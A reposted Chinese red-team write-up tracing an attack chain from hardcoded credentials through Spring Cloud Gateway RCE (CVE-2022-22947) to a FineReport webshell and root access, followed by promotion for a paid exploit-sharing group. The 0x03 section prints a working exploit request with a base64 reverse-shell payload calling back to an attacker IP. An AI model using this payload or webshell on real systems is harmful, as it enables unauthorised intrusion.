> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492762&idx=1&sn=eabfcc712413afb5f41f3567bf423828

#  一次红队实战案例分享：从低权限账户到域控的Spring生态渗透之旅  
AlbertJay  神农Sec   2025-07-08 05:00  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，EDUSRC证书站挖掘、红蓝攻防、渗透测试等优质文章，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠卷）。  
#   
  
文章作者：AlbertJay  
  
文章来源：https://www.freebuf.com/articles/defense/437259.html  
  
  
**从低权限账户到域控的Spring生态渗透之旅**  
  
  
## 前言  
  
攻防对抗中，红队的核心优势在于将看似孤立的脆弱点串联为致命攻击链。本文记录的实战案例始于一个被99%安全审计忽略的前端硬编码漏洞，却终结于核心业务系统的全面沦陷——这印证了ATT&CK框架的核心原则，防御失效往往源于薄弱环节的连锁反应。  
## 0x01 缘起：一个被忽视的前端硬编码  
  
在一次攻防演练实战中，作为红队成员，我在某企业业务系统的登录页面按下了F12。在Webpack打包的前端代码中，发现了一段令人咋舌的注释：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHuiaTrxWX8tWp3eWMUsnEs6KzuHgj4WnDyMrwb7SE78abmV76qiaaicaLQ/640?wx_fmt=png&from=appmsg "")  
  
利用硬编码的凭证成功登录后台，但该账号仅有基础查看权限。常规漏洞扫描（SQL注入/XSS/文件上传）无果。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHWQYOKmE1eJJugjO3IR1xDxicMZqkIXibfbO3w2RrzX31LgPAS3m9BErg/640?wx_fmt=png&from=appmsg "")  
  
却在访问错误路径时发现了关键线索：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxH4K5sGvfnOun5pTnPyyJCiaQHE6XdVC1gOricic6VUJlfE6RibssZnuYDgQ/640?wx_fmt=png&from=appmsg "")  
  
**Spring Boot特征**  
！立即启动目录扫描：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHNSR9ykptgiae5Yy3Q9RbW4ws0OlY87ZP9zJkF95c0zNrUDOFWVBSibQg/640?wx_fmt=png&from=appmsg "")  
  
结果如下：  
  
****## 0x02 突破口：Druid监控与Heapdump分析  
  
扫描发现存在Druid，尝试弱口令登录Druid后台成功（企业常见配置失误）。在SQL监控页面发现内网数据库地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHJS2DMAM6RfxV4BkicxuwDtZeQwsWBibsHlYOfkjB5vJ4MhKuMIfHpYTg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHpRI4nCzrvGVF4499HibrtC8us5WbTHxb2FNPxN6zyMqqF9icaSrKHrKQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHJLySfBAjwpW6hQlL37CdARIfeAEPic2icSeTibNBicU4UfBMhxicVwqMWrw/640?wx_fmt=png&from=appmsg "")  
  
更关键的是，heapdump文件可直接下载。使用**Eclipse Memory Analyzer**  
解析：  
1. 搜索关键词：password、secret、redis  
  
1. 定位springframework.cloud.gateway.route.RouteDefinition对象  
  
1. 发现内网配置：  
  
###   
## 0x03 致命一击：Spring Cloud Gateway RCE（CVE-2022-22947）  
  
网关的/actuator/gateway/routes端点暴露且无鉴权  
  
![1751335145_686340e92bbded8fb0d06.png!small?1751335146111](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHxnmUjDjqb9FxyLJFKDP8ur9rFWbHfBGIFexE1Wtk7ypZhKS6ghINVg/640?wx_fmt=jpeg&from=appmsg "")  
  
符合CVE-2022-22947漏洞条件：  
- **影响版本**  
：Spring Cloud Gateway < 3.1.1 或 < 3.0.7  
  
- **利用原理**  
：恶意SpEL表达式注入路由过滤器  
  
**攻击步骤**  
：  

```
POST /actuator/gateway/routes/shell HTTP/1.1  Host: xx.xx.xx.xx Content-Type: application/json
{
&#34;filters&#34;: [{
&#34;name&#34;: &#34;AddResponseHeader&#34;,
&#34;args&#34;: {
&#34;name&#34;: &#34;Result&#34;,
&#34;value&#34;: &#34;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuMTUvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\&#34;).getInputStream()))}&#34;
}
}],
&#34;uri&#34;: &#34;http://example.com&#34;
}
```

  
实战如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHLJJ1Bqne6RpVpibvaNA17x7Fg2gxoJLgib7grTgBkfqxKTpDibbXrNic0w/640?wx_fmt=png&from=appmsg "")  
  
**刷新路由触发执行****，**  
成功获取Shell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHm5Uskkqic6bJ7ldV6L0jecuhHDTNpQMp9yeRc3UeAqrjTMu7DxopRXg/640?wx_fmt=png&from=appmsg "")  
## 0x04 权限固化：某报表平台文件覆盖漏洞  
  
虽然已获得远程命令执行，但需要**持久化控制**  
。回到登录页面查看web路径发现该系统使用**某软报表系统****，****有**  
FineReport V9特征：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHsFzkNveI2nSich8kJ6P9yt51KkBRibycwapcq78KY8qOFukr8LkicibdYw/640?wx_fmt=png&from=appmsg "")  
  
利用**svg初始化漏洞**  
覆盖尝试写入文件，可以看到写入成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHrO7ySlEjEqvPr5Z00w8Eq3OUfxkg9WbXDLWt0hRZibicapjllgHI5JFg/640?wx_fmt=png&from=appmsg "")  
  
![1751335299_686341834223070f91647.png!small?1751335310493](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHQSJ0fp4dutGw6MQ82AKS7FtfQETcqLSRyeeiamtNsia5rIbHyEjq93cw/640?wx_fmt=jpeg&from=appmsg "")  
  
**利用结果****：**  
构造执行命令，再次上传jsp文件，访问/svg.jsp?cmd=ifconfig成功执行系统命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHgt6adYtXfW1WVlkm50A28FWicOtzJrYwMX22zSd8A97Gfkwh0GrpWuQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHQTbfQ3ibJRKhTow7nW378lOCiaFQTOFwABtxzHOu7p4D9vBElFlNzzSQ/640?wx_fmt=png&from=appmsg "")  
  
植入Webshell实现持久化  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxH098bTicTpnZ5FpXRtFQsO6EFxOWSibLeyfHLorBIelKkwr4kXMS5Ocnw/640?wx_fmt=png&from=appmsg "")  
  
提权获取root权限  
  
![1751335307_6863418b9dfb36f5c97df.png!small?1751335314950](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHdnukhfQXdObh0hTbUwcHQOcCRyYE0g3GOF1hPxNdnbH3XC5JJHsILw/640?wx_fmt=jpeg&from=appmsg "")  
## 0x05 攻击链全景  
  
完整攻击路径：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWnhibficl8TfsicnmWibZI9PxHYVArE3wrWPPnfkPrHpzetuDIGoUB8v6M7sUAZuNUHMLooUrmx8Xpwg/640?wx_fmt=png&from=appmsg "")  
## 结语  
  
本案例的攻陷路径映射到ATT&CK框架，暴露出企业防御的深层缺陷：  
  
**凭证管理失效：**  
硬编码凭证→弱口令复用→数据库密钥泄露的连锁反应，暴露了凭证生命周期管理的全面失控；  
  
**内生安全机制缺失：**  
Spring Cloud Gateway未修复漏洞（CVE-2022-22947）与暴露的Actuator端点，证明“默认安全”配置的全面失效；  
  
**威胁传导盲区：**  
从Druid监控系统到报表平台（FineReport）的权限跃迁，揭示供应链漏洞如何成为横向移动的“隐形桥梁”。  
  
  
**内部小圈子详情介绍**  
  
  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  

```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```

  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
星球现价   
￥45元  
  
如果你觉得应该加入，就不要犹豫，价格只会上涨，不会下跌  
  
星球人数少于900人 45元/年  
  
星球人数少于1000人 60元/年  
  
（新人优惠卷20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU0bsia0ju14OCUfVMSnyJJX4SAHwM2uxfzyQ99oMpk5ib5iavqd6nQicUWV26KKYYvm9e9AkIXKBYFBg/640?wx_fmt=png&from=appmsg "")  
  
欢迎加入星球一起交流，券后价仅45元！！！ 即将满900人涨价  
  
长期  
更新，更多的0day/1day漏洞POC/EXP  
  
  
  
**内部知识库--**  
**（持续更新中）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFu12KTxgSfI69k7BChztff43VObUMsvvLyqsCRYoQnRKg1ibD7A0U3bQ/640?wx_fmt=png&from=appmsg "")  
  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=png&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
  
不会挖CNVD？不会挖EDURC？不会挖企业SRC？不会打nday和通杀漏洞？  
  
直接加入我们小圈子：  
知识星球+内部圈子交流群+知识库  
  
快来吧！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
神农安全知识库内部配置很多  
内部工具和资料💾，  
玄机靶场邀请码+EDUSRC邀请码等等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
快要护网来临，是不是需要  
护网面试题汇总  
？  
问题+答案（超级详细🔎）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
最后，师傅们也是希望找个  
好工作，那么常见的  
渗透测试/安服工程师/驻场面试题目，你值得拥有！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=png&from=appmsg "")  
  
  
内部小圈子——  
圈友反馈  
（  
良心价格  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8Hviaqs0Uv6F4NTNkTKDictgOV445RLkia2rFg6s6eYTSaDunVaRF41qBibY1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8HviaRhLXFayW3gyfu2eQDCicyctmplJfuMicVibquicNB3Bjdt0Ukhp8ib1G5aQ/640?wx_fmt=png&from=appmsg "")  
  
  
****  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWWVED9b2pQcIicYSpecBvsgjoKVqQwoTMrP4ib6NKzia8NLsUo6Z1ykmp2rpHPyNNgKeoKWpzOrgZQ0Q/640?wx_fmt=jpeg&from=appmsg "")  
  
    

```
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
